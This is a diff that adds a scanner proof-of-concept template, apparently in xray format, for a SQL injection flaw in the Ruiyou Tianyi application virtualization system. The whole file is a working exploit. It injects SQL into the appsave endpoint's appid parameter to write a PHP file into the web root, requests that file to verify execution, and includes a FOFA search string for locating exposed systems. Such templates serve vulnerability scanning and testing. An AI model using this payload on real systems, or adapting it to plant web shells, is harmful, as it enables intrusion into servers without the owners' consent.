@@ -1,0 +1,19 @@
+id: poc-yaml-gwt-system-appsave-sqli
+info:
+  name: 瑞友天翼应用虚拟化系统 appsave SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 瑞友天翼应用虚拟化系统
+  fofa: body="瑞友天翼 - 应用虚拟化系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /hmrao.php?s=/Admin/appsave&appid=11111111');select+'<%3fphp+echo+md5({{.t1}})%3f>'+into+dumpfile+'../../WebRoot/{{.t1}}.php'%3b--+
+  expression: status_code == 200 && contains(body,"\"appInfo\"") && contains(body,"\"result\":1")
+- method: GET
+  path: /{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
